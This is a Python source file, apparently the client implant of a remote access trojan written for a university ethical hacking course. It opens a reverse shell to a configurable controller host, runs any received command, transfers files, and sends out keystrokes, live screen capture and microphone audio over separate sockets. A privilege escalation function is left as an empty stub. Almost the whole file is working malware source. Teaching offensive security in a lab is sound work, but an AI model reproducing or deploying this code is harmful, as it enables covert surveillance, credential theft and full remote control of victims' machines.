################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

import socket
import time
import subprocess
import json
import os
import cv2
import numpy as np
import pyautogui
import struct
import mss
import pyaudio
from dotenv import load_dotenv
import threading
import multiprocessing

# ====================
# Environment
# ====================

# Load environment variables from .env file
dotenv_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../.env'))
load_dotenv(dotenv_path)

# Set variables based on .env values
TARGET_IP = os.getenv("TARGET_IP", "127.0.0.1")
TARGET_PORT = int(os.getenv("TARGET_PORT", 5000))
VIDEO_PORT = int(os.getenv("VIDEO_PORT", 9000))
AUDIO_PORT = int(os.getenv("AUDIO_PORT", 6000))
KEYLOGGER_PORT = int(os.getenv("KEYLOGGER_PORT", 7000))

# Use these variables in your code
print(f"Target IP: {TARGET_IP}")
print(f"Target Port: {TARGET_PORT}")
print(f"Video Port: {VIDEO_PORT}")
print(f"Audio Port: {AUDIO_PORT}")
print(f"Keylogger Port: {KEYLOGGER_PORT}")

reconnection_delay = 1

# ====================
# Utils Function
# ====================

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    if not os.path.isfile(file_name):
        error_message = f"ERROR: File '{file_name}' not found."
        s.send(error_message.encode())
        return
    
    with open(file_name, 'rb') as f:
        s.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

# ====================
# Shell Command
# ====================

def shell():
    while True:
        command = reliable_recv()

        # Common command
        if command == 'quit':
            stop_screen_stream()
            stop_keylogger()
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            dir_change = command[3:]
            try:
                os.chdir(dir_change)
                reliable_send({'stdout': os.getcwd(), 'stderr': ''})
            except FileNotFoundError as e:
                reliable_send({'stdout': '', 'stderr': f'cd: no such file or directory: {dir_change}\n'})
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])

        # Screen Streaming
        elif command == 'screen':
            time.sleep(1)
            # print("welcome to screen streaming")
            start_screen_stream()

        # Keylogger
        elif command == 'keylogger':
            time.sleep(3)
            keylogger_handler()

        # Privelege Escalation
        elif command == 'privesc':
            privilege_escalator()

        # Others
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

# ====================
# Feature 1: Keylogger
# ====================

from pynput import keyboard

def socket_send(target, data):
    try:
        jsondata = json.dumps(data)
        target.send(jsondata.encode())
        print(f"Sent: {data}")  # Print sent data for debugging
    except Exception as e:
        print(f"Error sending data: {e}")

def on_press(key, target):
    try:
        if hasattr(key, 'char') and key.char:
            socket_send(target, f'{key.char}')
            keyname = key.char
        else:
            socket_send(target, f'{key.name}')  # Send the name of the special key
            keyname = key.name
        print(f"Key pressed: {keyname}")  # Print pressed key for debugging
    except Exception as e:
        socket_send(target, str(e))
        print(f"Error on press: {e}")

def keylogger_reader(target):
    print("Welcome to keylogger")
    with keyboard.Listener(on_press=lambda key: on_press(key, target)) as listener:
        print("Keylogger started. Press ESC to exit.")
        listener.join()

def keylogger_handler():
    global keylogger_socket, keylogger_thread
    keylogger_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        keylogger_socket.connect((TARGET_IP, KEYLOGGER_PORT))
        print(f"Keylogger connected to {TARGET_IP}:{KEYLOGGER_PORT}")

        keylogger_thread = threading.Thread(target=keylogger_reader, args=(keylogger_socket,))
        keylogger_thread.daemon = True  # Daemonize the thread to ensure it terminates with the main program

        print("Starting keylogger handler...")
        keylogger_thread.start()
        print("Keylogger handler thread started.")

    except ConnectionRefusedError as e:
        print(f"Connection refused: {e}")
    except Exception as e:
        print(f"Error in keylogger handler: {e}")

# Function to stop screen streaming process
def stop_keylogger():
    global keylogger_socket, keylogger_thread
    try:
        print("Terminating keylogger and main program...")
        if keylogger_socket:
            socket_send(keylogger_socket, "TERMINATE")
            keylogger_socket.close()
        if keylogger_thread:
            keylogger_thread.join(timeout=1)
    except NameError:
        print("Screen streaming process not running.")  

# ====================
# Feature 2: Privilege Escalation
# ====================

def privilege_escalator():
    # TODO
    pass

# ====================
# Feature 3: Screen Streaming
# ====================

# Constants
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

# Video stream
def video_stream(client_socket):
    w, h = pyautogui.size()
    monitor = {"top": 0, "left": 0, "width": w, "height": h}
    
    try:
        t0 = time.time()
        n_frames = 1
        with mss.mss() as sct:
            while True:
                screen = sct.grab(monitor)
                frame = np.array(screen)
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                message = struct.pack(">L", len(buffer)) + buffer.tobytes()
                try:
                    client_socket.sendall(message)
                except BrokenPipeError:
                    print("Broken pipe error, connection lost.")
                    break

                elapsed_time = time.time() - t0
                avg_fps = (n_frames / elapsed_time)
                # print("Screen Average FPS: " + str(avg_fps))
                n_frames += 1
    except KeyboardInterrupt:
        print("Stopped by user.")
    finally:
        client_socket.close()

# Audio stream
def audio_stream(client_socket):
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
    
    try:
        print("Recording audio...")
        while True:
            try:
                mic_data = stream.read(CHUNK, exception_on_overflow=False)
                message = struct.pack(">L", len(mic_data)) + mic_data
                try:
                    client_socket.sendall(message)
                except BrokenPipeError:
                    print("Broken pipe error, connection lost.")
                    break
            except IOError as e:
                if e.errno == -9981:
                    print("Buffer overflowed. Skipping this chunk.")
                else:
                    raise
    except KeyboardInterrupt:
        print("Audio stream stopped by user.")
    finally:
        client_socket.close()
        stream.stop_stream()
        stream.close()
        p.terminate()

# Screen streamer
def screen_streamer():

    # Video streaming
    video_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    video_socket.connect((TARGET_IP, VIDEO_PORT))
    video_thread = threading.Thread(target=video_stream, args=(video_socket,))
    
    # Audio streaming
    audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    audio_socket.connect((TARGET_IP, AUDIO_PORT))
    audio_thread = threading.Thread(target=audio_stream, args=(audio_socket,))
    
    # Start threads
    video_thread.start()
    audio_thread.start()
    
    video_thread.join()
    audio_thread.join()

# Function to start screen streaming in a separate process
def start_screen_stream():
    global screen_process
    
    # Create a new process for screen streaming
    screen_process = multiprocessing.Process(target=screen_streamer)
    screen_process.start()
    
    # Print process ID for reference
    print(f"Screen streaming process started with PID: {screen_process.pid}")

# Function to stop screen streaming process
def stop_screen_stream():
    global screen_process
    try:
        if screen_process and screen_process.is_alive():
            # Terminate the process
            screen_process.terminate()
            screen_process.join(timeout=1)  # Wait for termination
            print("Screen streaming process terminated.")
    except NameError:
        print("Screen streaming process not running.")  

# ====================
# Main Program
# ====================

def connect():
    while True:
        time.sleep(reconnection_delay)
        try:
            s.connect((TARGET_IP, TARGET_PORT))
            shell()
            s.close()
            break
        except:
            connect()

if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect()